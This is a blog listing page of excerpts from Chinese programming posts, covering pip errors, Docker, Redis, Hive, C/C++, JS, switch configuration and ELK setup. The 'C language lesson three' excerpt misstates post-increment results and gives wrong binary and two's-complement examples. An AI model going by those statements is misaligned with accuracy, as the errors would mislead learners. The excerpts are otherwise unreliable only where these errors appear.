<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6e75dccadbebd7c865e9bc85854d3e7d/" rel="bookmark">
			解决升级完pip后无法使用pip的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、问题由来 问题是这么来着，由于需要在我的windows系统下用cmd输入pip指令(pip install opencv-python)安装opencv-python库的，但是由于没有使用–user，即刚开始没有权限，但同时它有提示说我的pip可以更新到最新版本。故我就先更新了(python -m pip install --upgrade pip),显示更新成功，但痛苦的开始就在这。我更新完之后，如之前操作再次输入install指令，然后就一直有如下错误：
Traceback (most recent call last): File "c:\program files (x86)\python37-32\lib\runpy.py", line 193, in _run_module_as_main "__main__", mod_spec) File "c:\program files (x86)\python37-32\lib\runpy.py", line 85, in _run_code exec(code, run_globals) File "C:\Program Files (x86)\Python37-32\Scripts\pip.exe\__main__.py", line 9, in &lt;module&gt; TypeError: 'module' object is not callable 百度了很久，用各种关键词找，如直接复制“Traceback (most recent call last):”和“TypeError: ‘module’ object is not callable”，或是搜索“pip升级后无法使用”都没有找到任何解决办法。只找到一篇类似有点关联的文章，如链接解决升级pip过后 无法使用pip问题，但是没有什么用，于是我开始自己摸索。
二、柳暗花明 链接里说的删除pip文件夹，我试过了，但是我的cmd还是提示如下：
Looking in links: C:\Users\SPANKZ~1\AppData\Local\Temp\tmp0shfhajx Requirement already satisfied: setuptools in c:\program files (x86)\python37-32\lib\site-packages (40.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6e75dccadbebd7c865e9bc85854d3e7d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9093d3ac87e925a6cbb08c210a9185ca/" rel="bookmark">
			JS小数位toFixed向下取整如何阻止自动进位？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 遇到一个问题，后台返回的数据是整型的，需要展示为除以一千后的小数，并且保留三位不进位小数，即向下取整保留三位小数，但是JS的toFixed(3)会自动进位。思来想去，发现这类问题，可以保留多一位（n位），最后只截取n-1位展示即可。
function getNumValue(value) { if ($.isNumeric(value) &amp;&amp; value != -2147483647 &amp;&amp; value != -2147483648) { var s = (parseInt(value) / 10000).toFixed(4); return s.substring(0, s.length - 1) + "" ; } } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a0bffc5af8fb65e1d798f4a142c3ff0a/" rel="bookmark">
			初识c语言第三节课
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		操作符
1.
~表示按(二进制)位取反，即把所有二进制位中数字0变成1,1变成0
例如
int a =0;
printf("~a=%d"，~a)
打印出来=-1
到这里就引出了一个新的知识点
即，一个整数的二进制有三种表示方式，而整数在内存中储存的是补码。
下面以此为例子
a = 0 ，因为a是int类型，所以a一共占了四个字节，而一个字节又是8个bit位
所以a在二进制里表示为00000000000000000000000000000000共32个bit位
那么~a的表示为1111111111111111111111111111111111
而~a为整数，在内存中储存的是补码。
所以又引出了一个新的概念：负数的原码，反码，和补码的转换
原码：1111111111111111111111111111111111↓
反码：100000000000000000000000000000↓
补码：100000000000000000000000000001
第一位为符号位，0为正数，1为负数；由原码变成反码则除符号位其他全部按位取反；由反码变为补码则在反码+1
正数来说就比较简单，原码，反码，补码都是一样的
以上所说的原码，反码，补码都是在二进制的基础上完成的。
2.
++操作符，包含前置和后置
例如
int a =10
b=a++，此时printf a，b分别为10,11
b=++a，此时printf a，b分别为11 11
即前置++是先+再使用，后置++是先使用后+
3.
（）强制类型转化
例如
int a = 3.2
此时printf（“%d”，a）会报警告
那么我们就可以使用（）
即int a =（int）3.2，此时（）中的数据类型就是要转化的类型
最后打印出来就是3
4.
关系操作符
等于是两个==判断相等。
5.
逻辑操作符
&amp;&amp;表示在导入的数据中，一个假则全假（0为假，其余自然数为真。）
||表示在导入的数据中，有一个真则全真。
6.
条件操作符（三目操作符）
exp1成立，exp2计算，最后整个表达式的结果是epx2
exp1不成立，exp3计算，最后表达式的结果是exp3
下面举例：
int a = 1
int b = 2
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a0bffc5af8fb65e1d798f4a142c3ff0a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0c537958a2fa843c521047feb45d6fd9/" rel="bookmark">
			Error: Failed to download metadata for repo ‘appstream‘: Cannot prepare internal mirrorlist
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 最近在学习docker，在学习Docker File的时候，通过DockerFile文件来创建自己的镜像的时候，通过yum -y install vim出现了报错。
Error: Failed to download metadata for repo ‘appstream‘: Cannot prepare internal mirrorlist。
通过查阅相关文件，将DockerFile文件改为如下形式就能够完成安装，DockrFile本质还是一个脚本文件，只需要把解决方案写入到DockerFIle中即可解决。
FROM centos MAINTAINER abcd&lt;test@qq.com&gt; ENV MYPATH /usr/local WORKDIR $MYPATH RUN cd /etc/yum.repos.d/ RUN sed -i 's/mirrorlist/#mirrorlist/g' /etc/yum.repos.d/CentOS-* RUN sed -i 's|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g' /etc/yum.repos.d/CentOS-* RUN yum makecache RUN yum update -y RUN yum -y install vim RUN yum -y install net-tools EXPOSE 80 CMD echo $MYAPTH CMD echo "----end----" 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/816afa2e1b6e609549a738913e134d27/" rel="bookmark">
			【maven】解决the java_home environment variable is not defined correctly问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【配置maven】出现报错： the java_home environment variable is not defined correctly This environment variable is needed to run this program NB: java_home should point to a jdk not a jre 1、首先我们要检查自己的jdk和jre所在的目录2、重新配置JAVA_HOME和path the java_home environment variable is not defined correctly This environment variable is needed to run this program NB: java_home should point to a jdk not a jre) 1、首先我们要检查自己的jdk和jre所在的目录 2、重新配置JAVA_HOME和path 原因：JAVA_HOME应该设为D:\jdk路径\，path中，改为%JAVA_HOME%\bin
一定要到jdk所在的目录
PS：如果还是报错的话，可以删掉之前配置的JAVA_HOME和path;MAVEN_HOME,删掉重新配置后,cmd，mvn -version
出现一下情况即为成功：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4805de8cdf6e4e981c3b1656f7c0bf62/" rel="bookmark">
			redis的常用类型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. String类型 String类型，也就是字符串类型，是Redis中最简单的存储类型。其value是字符串，不过根据字符串的格式不同，又可以分为3类：
string：普通字符串int：整数类型，可以做自增、自减操作float：浮点类型，可以做自增、自减操作 不管是哪种格式，底层都是字节数组形式存储，只不过是编码方式不同。字符串类型的最大空间不能超过512m.
键值msghello worldnum10score92.5 String的常见命令有：
1、SET：添加或者修改已经存在的一个String类型的键值对
SET name 666 复制代码 2、GET：根据key获取String类型的value
GET name 复制代码 3、MSET：批量添加多个String类型的键值对
MSET name 111 age 18 复制代码 4、MGET：根据多个key获取多个String类型的value
MGET name age 复制代码 5、INCR：让一个整型的key自增1
INCR age 复制代码 6、INCRBY:让一个整型的key自增并指定步长，例如：incrby age 2 让age值自增2
INCRBY age 2 复制代码 7、INCRBYFLOAT：让一个浮点类型的数字自增并指定步长
INCRBYFLOAT money 3.0 复制代码 8、SETNX：添加一个String类型的键值对，前提是这个key不存在，否则不执行
SETNX name 2222 复制代码 9、SETEX：添加一个String类型的键值对，并且指定有效期
SETEX name 5 clickonlike 复制代码 注：
Redis的key允许有多个单词形成层级结构，多个单词之间用':'隔开，格式如下：
set Jie:user:1 '{"id":1, "name": "JIE", "age": 21}' 复制代码 2 Hash类型 Hash类型，也叫散列，其value是一个无序字典，类似于Java中的HashMap结构。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4805de8cdf6e4e981c3b1656f7c0bf62/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7908dd0056d56a9f90469e19670bce36/" rel="bookmark">
			基于QuartusII9.1的ADC和DAC控制仿真设计
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、实验目的 1
二、实验所用仪器（或实验环境） 1
三、实验基本原理及步骤（或方案设计及理论计算） 1
四、实验数据记录（或仿真及软件设计） 2
控制器（AD_DA.vhd[3]） 2
ADC0832测试模块（ADC0832.vhd[4]） 6
波形仿真 10
Flow Summary 10
五、实验结果分析及回答问题（或测试环境及测试结果） 11
适用的速度及精度场合 11
总结 11
写给曾经的自己 11
参考文献 12
适用的速度及精度场合
从速度方面看，ADC0832工作频率为250KHZ，而DAC0832的转换时间约为1us，即DAC0832的转换速度远快与DAC0832，因此可使用250KHZ的时钟源作为两者共同的时钟源。
从精度方面看，作为单通道模拟信号输入时ADC0832的输入电压是0~5V且8位分辨率时的电压精度为19.53mV。如果作为由IN+与IN-输入的输入时，可是将电压值设定在某一个较大范围之内，从而提高转换的宽度。但值得注意的是，在进行IN+与IN-的输入时，如果IN-的电压大于IN+的电压则转换后的数据结果始终为00H。[5]
通过这次课程设计，又一次复习了之前在数电课程中学习到的VHDL语言程序设计，也让我对数字电路有了更深刻的理解和感悟。
由于开始时对这次课程设计题目理解不到位，本以为是要用VHDL程序模拟ADC和DAC的工作过程，本文转载自http://www.biyezuopin.vip/onews.asp?id=15100而后经过与同学们的讨论才明白是要为FPGA编程从而控制ADC0832和DAC0832工作。至此我才明白了FPGA在电路设计中的作用，以及数字电路和模拟电路是如何协同工作的。
在设计程序的过程中，由于ADC0832和DAC0832工作时序的特殊性，要以有限状态机的形式设计程序，在自己分析设计状态转换的过程中，将状态转换的程序设计和时序电路的状态转换联系了起来。而编程的过程中，由于对硬件语言的理解不到位，用高级语言的思维去理解时导致了一些问题，在解决问题的过程中加深了对程序设计底层实现的理解。
/* WARNING: Do NOT edit the input and output ports in this file in a text editor if you plan to continue editing the block that represents it in the Block Editor! File corruption is VERY likely to occur.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7908dd0056d56a9f90469e19670bce36/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ea73173f06dda19ff17b1b82b71561d0/" rel="bookmark">
			实训二：交换机的配置模式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、实验目的 1、了解交换机不同的配置模式的功能。 2、了解交换机不同配置模式的进入和退出方法。 二、应用环境 在实训一中，我们可以成功的进入交换机的配置界面。我们所看到的配置界面称之为CLI界面，CLI界面又称为命令行界面，和图形界面（GUI）相对应。CLI的全称是command line interface，它由shell程序提供，它是由一系列的配置命令组成的，根据这些命令在配置管理交换机时所起的作用不同，shell将这些命令分类，不同类别的命令对应着不同类别的怕配置模式。
命令行界面是交换机调试界面中的主流界面，基本上所有的网络设备都支持命令行界面。国内外主流的网络设备供应商使用很相近的命令行界面，方便用户调试不同厂商的设备。
三、实验设备 1、神州数码DCN-CS6200交换机 1 台
2、PC 1 台
3、交换机Console线 1 根
四、实验拓扑 五、实验要求 1、熟悉一般用户配置模式。 2、熟悉特权用户配置模式。 3、了解全局配置模式。 4、了解接口配置模式。 4、了解VLAN配置模式。 六、实验步骤 第一步：使用secureCRT登陆交换机，进入一般用户配置模式，我们可以用“？“命令查看该模式下能够使用的命令。如下图所示：
第二步：特权用户模式配置的方法。 在一般用户配置模式下输入“enable” 进入特权用户配置模式。特权用户配置模式的提示符为”#“，所以也成为”#”模式。此时，我们也可以使用“？”，命令查看该模式下能够使用的命令（该模式下的命令比较多如下图所示）
特权用户配置模式下，用户可以查询交换机的配置信息，各个端口的连接情况、收发数据统计等。而且进入特权用户模式后，可以进入到全局配置模式对交换机的各项配置进行修改，因此进特权用户配置模式是必须要设置特权用户口令，防止非特权用户的非法使用，造成不必要的损失。
第三步：全局配置模式的配置方法。 在特权模式下输入“config terminal”或者“config t”或者“config”就可以进入全局配置模式，一般使用“config”比较简单。全局配置模式也称为“config”模式。
在全局配置模式，用户可以对交换机进行全局的配置，如对MAC地址表、端口镜像、创建VLAN、启动IGMP Snooping、GVRP、STP等。用户在全局模式还可以进入到各个端口对端口进行配置。
刚才也讲到为了防止非法篡改必须要设置密码，设置特权用户密码如下：
命令：CS6200-28X-EI(config)#enable password admin 也可以在admin前面加一个0那样是以明文形式显示。
验证方法：
第一种：重新进入交换机 CS6200-28X-EI&gt;enable
Password:
CS6200-28X-EI#
第二种：使用show命令查看 CS6200-28X-EI(config)#show running-config switch convert mode stand-alone
no service password-encryption
hostname CS6200-28X-EI
sysLocation China
sysContact 400-810-9119
enable password level 15 0 admin 该行显示了已经为交换机配置了enable密码
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ea73173f06dda19ff17b1b82b71561d0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7fa2f2351c7887d0965bb030533790c3/" rel="bookmark">
			JS中的变量提升（var、let、const的区别）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		变量提升是指js中的变量和函数会在代码编译之前，提升到代码的最前面，前提是使用var声明变量，而使用let或者const变量就不会提升，变量提升时只有声明会被提升，赋值则不会，函数声明提升比变量声明优先级要高。
分别说一下它们的特点，var会变量提升，可以重复声明，不具有局部作用域；而let和const都不会变量提升，也不能重复声明，但具有局部作用域，特别需要注意的是，const一般用来声明常量，声明时必须赋值，例如声明数组或者const pi=3.14这种数学常量。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/03bd373b3895bf281f8c37cbf5fe2639/" rel="bookmark">
			Spring boot实操演练5 ——导入Excel文件到数据库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1、业务场景
（1）、分享原因
（2）、需求分析
（3）、数据库设计
2、开发环境和工具
3、代码思路
4、参考代码
导出模板vo（KitchenStoreExcelVo）
商铺信息表（HwKitchenStoreInfo）
Mapper 接口(HwKitchenStoreInfoMapper)
Mapping.xml(HwKitchenStoreInfoMapper.xml)
controller层(KitchenStoreManageController)
service层(IKitchenStoreManageService)
serviceImpl层(KitchenStoreManageServiceImpl)
5、总结
1、业务场景 （1）、分享原因 之前笔者分享过导出功能的一种写法，既然有导出功能，那相对的导入功能也是存在的一种需求，本期笔者就分享一下导入功能的一种思路；
（2）、需求分析 导入功能可分为两个子需求，子需求1是下载导入模板，子需求2是导入模板数据；
（3）、数据库设计 本次代码演示使用的业务背景是商铺基本信息管理，预插入数据对应的数据库设计如下图所示：
餐厨商铺信息表
2、开发环境和工具 因为该业务功能是在我实习公司已有项目下的拓展，所以环境依赖较多，我将重点阐述我所负责的后端代码逻辑，开发环境和工具只会简单带过；如果在借鉴代码过程中缺失包或者依赖，请根据IDE提示或者自行百度调试（就当锻炼自己对开发工具的熟悉程度啦）；
（1）、IDE：IntelliJ IDEA 2022.1
（2）、测试：Postman
（3）、JDK：jdk-11.0.15
（4）、Spring Boot Version：2.2.5.RELEASE
（5）、modelVersion：4.0.0
（6）、pomVersion：0.0.1-SNAPSHOT
3、代码思路 4、参考代码 本次导入功能以最简单的（商铺）管理为代码背景来进行展示和说明：
导出模板vo（KitchenStoreExcelVo） 代码说明：
（1）、@Excel里面需要声明三个东西：
name：列名，对应数据库需要的字段；必填还是选填取决于数据库对应的字段能否为空，可以添加适当备注引导使用者正确填写；注意！并不是所有的数据库字段都需要用户导入，这里选择字段时参照的标准是对应新增功能需要用户填写的信息，所以本质是一个变相的新增功能，只是可以达到批量新增的效果而已；
orderNum：第几列，从0（这里的0等价于第1列）开始；
width：列宽，长度定义取决于你的列名（name）的长度，自行调试感受就行；
（2）、其他就是Vo的基本写法了，定义好属性后idea可以一键生成get和set方法，只需要右键空白处然后点击弹出菜单的Generate选择Getter and Setter，最后全选对应的属性即可；
package xxx.vo; import cn.afterturn.easypoi.excel.annotation.Excel; import com.fasterxml.jackson.annotation.JsonFormat; import java.util.Date; /** * &lt;p&gt; * 商铺信息导入excel模板下载用vo * &lt;/p&gt; * * @author Mike-GY * @since 2022-08-29 */ public class KitchenStoreExcelVo { /** * 商铺名称 */ @Excel(name = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/03bd373b3895bf281f8c37cbf5fe2639/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f7c1e0d1af5ec35c58a6b887016787c7/" rel="bookmark">
			hive中常用的日期处理函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		哈喽，大家好，最近工作中遇到很多日期处理问题，比较头疼，今天给大家整理一下hive的比较常用的日期处理函数，欢迎大家的点赞和转发。多谢大家。
date_format
释义：格式化日期
用法：date_format(date,格式)
例如：
将日期格式化为：2020-05-01和2020-05
hive &gt; select date_format('2020-05-01 12:00:00','yyyy-MM-dd'); 2020-05-01 hive &gt; select date_format('2020-05-01 12:00:00','yyyy-MM'); 2020-05 date_add 释义：日期加法函数，数字为正，则加多少天，若数字为负数，则为减多少天；
用法：date_add(date,number);
例如：
将日期增加或减少4天；
hive&gt; select date_add('2019-05-09',4); 2019-05-13 hive&gt; select date_add('2019-05-09',-4); 2019-05-05 data_sub
释义：日期减法函数，数字为正，则减多少天，若数字为负数，则为加多少天
用法：date_sub(date,number)
例如：
将日期增加或减少4天
hive&gt; select date_sub('2019-05-09',4); 2019-05-05 hive&gt; select date_sub('2019-05-09',-4); 2019-05-13 next_day 释义：取该日期的下一个周几的日期
用法：next_day(date,dayofweek)
星期一到星期日的英文（Monday，Tuesday、Wednesday、Thursday、Friday、Saturday、Sunday）
例如：
取5.1后的下一个周五
hive&gt; select next_day('2020-05-01',"Fri"); 2020-05-08 last_day 释义：取当月的最后一天日期
用法：last_day(date)
例如：
取5月的最后一天日期
hive&gt; select last_day('2020-05-01'); 2020-05-31 hive&gt; select last_day('2020-04-01'); 2020-04-30 datediff
释义：日期比较函数，第一个日期减去第二个时期数字，为正，则前者大于后者，为负，则前者小于后者；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f7c1e0d1af5ec35c58a6b887016787c7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/11e998799a75fcc3665fdf5f834f8450/" rel="bookmark">
			C&#43;&#43; mutable关键字
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、mutable关键字作用 今天在看代码的时候，发现有个关键字mutable好像没见过，特此记录一下其使用方法。mutable是用来修饰在可以在const函数中改变的成员变量。其使用比较简单。
2、mutable示例 如下面代码和编译结果所示，如果在const函数中修改数据，编译器会提示报错，从而无法通过编译。
#include &lt;iostream&gt; #include &lt;string.h&gt; #include &lt;vector&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/io.h&gt; #include &lt;unistd.h&gt; #include &lt;fstream&gt; using namespace std; class Test { public: Test(); int getIntData() const; std::string getStringData() const; float getFloatData() const; private: float mFloatData; int mIntData; std::string mStringData; }; Test::Test() { mFloatData = 15.0; mIntData = 10; mStringData = "[Test] init string data."; } int Test::getIntData() const { mIntData = mIntData + 10; return mIntData; } std::string Test::getStringData() const { mStringData = mStringData + std::string("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/11e998799a75fcc3665fdf5f834f8450/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0c61a3d54a801be1c9676b0cca84d280/" rel="bookmark">
			Linux应用程序崩溃定位
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景 最近项目中用到了一个库，在程序崩溃时可以生成exception文件，记录程序崩溃时的调用信息，对于定位问题比较有价值，因此整理下这个库涉及到的知识点。相关测试代码已经放到github可以下载调试。
基础知识 maps maps用来描述进程的虚拟地址空间是如何使用的。总共包括六列，每列及其含义如下：
名字含义address本段在虚拟内存中的地址范围。perms本段的权限，r-读，w-写，x-执行， p-私有，s-共享。offset即本段映射地址在文件中的偏移。dev主设备号与次设备号：所映射的文件所属设备的设备号。inode文件索引节点号。pathname映射的文件名。
对有名映射而言，是映射的文件名。
对匿名映射来说，是此段内存在进程中的作用。
[stack]表示本段内存作为栈来使用，[heap]作为堆来使用，其他情况则为无。 对于有名的内存区间而言，属性为r--p表示存放的是rodata;属性为rw-p存放的是bss和data;属性为r-xp表示存放的是text数据。没有文件名的内存区间则表示用mmap映射的匿名空间。
以下为./example/maps_test.c编译成的可执行文件mapstest的运行结果：
code addr = 0x55e1df08d6da A_global_addr = 0x55e1df28e034 B_global_init0_addr = 0x55e1df28e020 C_global_init_addr = 0x55e1df28e010 D_global_static_addr = 0x55e1df28e024 E_global_static_init0_addr = 0x55e1df28e028 F_global_static_init_addr = 0x55e1df28e014 G_global_const_addr = 0x55e1df08d998 a_addr = 0x7ffce299bb90 b_init0_addr = 0x7ffce299bb94 c_init_addr = 0x7ffce299bb98 d_static_addr = 0x55e1df28e02c e_static_init0_addr = 0x55e1df28e030 f_static_init_addr = 0x55e1df28e018 g_const_addr = 0x7ffce299bb9c h1_arr_addr = 0x7ffce299bbb2 h2_strconst_addr = 0x55e1df08d99c h2_point_addr = 0x7ffce299bba0 i_malloc_addr = 0x55e1dfd1d260 ps -ef| grep mapstest得到进程对应的pid号，maps文件如下：（路径为/proc/{pid}/maps）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0c61a3d54a801be1c9676b0cca84d280/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aa2df951af0995fadad3c41236706931/" rel="bookmark">
			games101学习笔记_shading1(着色)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		games101_着色1 可视性 / 遮挡(Visibility / occlusion)画家算法(Painter 's Algorithm)深度缓冲(Z-Buffer/Depth Buffer)Z-Buffer算法伪代码实现Z-Buffer复杂度 着色(Shading)着色的定义一个简单的着色模型（Blinn - Phong Relectance Model）着色是局部的(Shading is Local)计算某一着色点的光照 漫反射(Diffuse Reflection)被接受到的光光衰减（Light Falloff） 可视性 / 遮挡(Visibility / occlusion) 画家算法(Painter 's Algorithm) 画家算法的提出主要是为了实现深度缓冲.
画家在画油画时，总是会从远景开始画，然后逐渐画近景覆盖远景，比如下图：最先画出一个蓝色的山，然后接着画绿地覆盖蓝色的闪，然后再接着画上几棵树覆盖绿地。
比如我们想要画一个正方体：
先画出最后面的面，然后再画上面和右面，最后画正面。就可以得到这样一个正方体。先画背面最后画正面可以理解，那么四个侧面的顺序是如何决定的？目前我们只是暂时用这种画法，没有什么特殊的决定方法。但是若更改一下顺序，先画上面和左面，再画右面和底面，就会导致右面有一条线无法被覆盖，立方体的上面就会多出一条线。
按照画家算法的思想，要先对三角形的深度进行排序（O(nlogn)），排完序之后再按照从深到浅的顺序画三角形。但是这样实际应用的时候就会有问题，如下图：
这种情况下，我们无法对这三个三角形按照深度进行排序。
针对这个问题，在之后又提出了另外一种解决方法。
深度缓冲(Z-Buffer/Depth Buffer) Z-Buffer的想法是不再对物体做远近排序，而是对每个像素做排序。
简单来说就是2D屏幕上的每个像素都记录两个缓存值。
这两个值分别是：
该像素所对应的3D物体的最小的Z轴坐标值，即对应像素的Z轴坐标。 详细来举例就是：比如说鼠标放在画面中的一个位置上，这个位置刚好是一个像素，在我们没有画出三角形之前，这个像素点是在地板上的，此时的像素点存的就是地板像素的深度值，但等我们画出正方体后，这个像素点又对应了正方体上的像素，此时正方体像素的深度值和地板像素的深度值比较，是正方体的深度值小，意味着在同一个像素上正方体会遮挡住地板，所以更新这个像素点的深度值，将其变为更小的深度信息。这个也叫做depth buffer 深度缓存，即存储每个像素点对应的深度信息 (深度图)。对应Z轴坐标的3D物体的颜色信息，即地面的绿颜色。 这个也叫作frame buffer，即存储每个像素点对应的颜色信息,这个buffer其实就是最后生成的图片 (最后结果)。
在这里有一个需要注意的问题： 之前的内容，我们始终假设相机位于原点，且朝着Z轴负方向，所以离相机越近，Z轴坐标绝对值越小，反之越大。这里为了方便起见（仅讨论深度问题），所以假设Z值永远是正数，即Z越小，表示越近；反之越远。 在上图右，我们可以看到，离我们越近在图片中就显示地越黑，离我们越远显示地就越白。
为了实现Z-Buffer，图形学中通常采用的做法是：在渲染最后成品图的同时，也会同时生成另外一个深度图像，这个深度图像只存储了任何一个像素它所看到的几何物体中最浅的深度信息。
Z-Buffer算法伪代码实现 初始化所有的深度为无限大。
在光栅化的时候：
for (each triangle T)	//对于任意一个三角形 for (each sample (x,y,z) in T)	//都可以将其光栅化成不同的像素	if (z &lt; zbuffer[x,y]) //如果当前的深度缓存值小于之前记录的深度缓存值	framebuffer[x,y] = rgb; //update color更新颜色值	zbuffer[x,y] = z; //update depth更新深度值 else // do nothing, this sample is occluded //什么都不做，这个采样点被遮挡 ; 上面仅代表深度图，而不是最后的成品图，其中R代表无限大。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aa2df951af0995fadad3c41236706931/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5effd15dd3444de14e9b133b02bf6bbd/" rel="bookmark">
			实验设计-假重复
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		可做如下表述：假重复是在采用推论统计学方法通过试验数据检验处理效果过程中，所设计的试验要么是处理没有重复（可能有样本重复），要么是重复不具统计学上的独立性。
简单伪重复是Hurlbert指出的若干种伪重复情形中的最简单的一种，但是在中国生态学试验中也是最常见的一种。
例如:为了研究某种施肥对土壤微生物生物量的影响而设置了两个试验小区，其中一个施加施肥处理而另一块对照处理；一段时间以后分别在两个样地各取样n个；认为这是有n个重复的试验而对两个区的调查结果进行统计检验。这个例子就是一个简单伪重复的试验设计。
这个试验设计在基本逻辑上存在漏洞:任何两个试验小区——即使在不进行任何处理的情况下——土壤微生物生物量就一定是不同的，而且只要取样量(n)足够大这种差异就一定能达到统计上显著的水平[2]。如果任何两个小区之间本来就是显著不同的,又怎么能说是处理导致了这两个小区的差异呢?
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7af17a7a49ab5fc831a023470018375f/" rel="bookmark">
			Docker安装ELK详细步骤(生产试验,适用所有版本)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		该文档适用所有版本的安装
享受优质模板阅读：前往
前言 公司新项目是DDD+微服务架构，部署采用Kubesphere，用过的小伙伴都知道，这日志真™用着难受。因此，公司要求集成elk，进行日志的统一管理~
生产环境：前端采用nginx进行的部署，后端则是通过kubesphere的一键式部署。
再此，就记录一下ELK搭建过程，分享给小伙伴们，避免时间的浪费
简介 ELK主要由ElasticSearch、Logstash和Kibana三个开源软件组成。
Elasticsearch ：分布式搜索引擎。具有⾼可伸缩、⾼可靠、易管理等特点。可以⽤于全⽂检索、结构化检索和分析，并能将这三者结合起来。Elasticsearch 是⽤Java 基于 Lucene 开发，现在使⽤最⼴的开源搜索引擎之⼀，Wikipedia 、StackOverflow、Github 等都基于它来构建⾃⼰的搜索引擎。在elasticsearch中，所有节点的数据是均等的。
Logstash ：数据收集处理引擎。⽀持动态的从各种数据源搜集数据，并对数据进⾏过滤、分析、丰富、统⼀格式等操作，然后存储以供后续使⽤。
Kibana ：可视化化平台。它能够搜索、展示存储在 Elasticsearch 中索引数据。使⽤它可以很⽅便的⽤图表、表格、地图展示和分析数据。
安装ELK 版本说明：Elasticsearch、Logstash、Kibana、Filebeat安装的版本号必须全部⼀致,不然会出现kibana⽆法显示web⻚⾯。
Elasticsearch与JDK版本要求：https://www.elastic.co/cn/support/matrix#matrix_jvm
镜像版本：https://hub.docker.com/_/elasticsearch
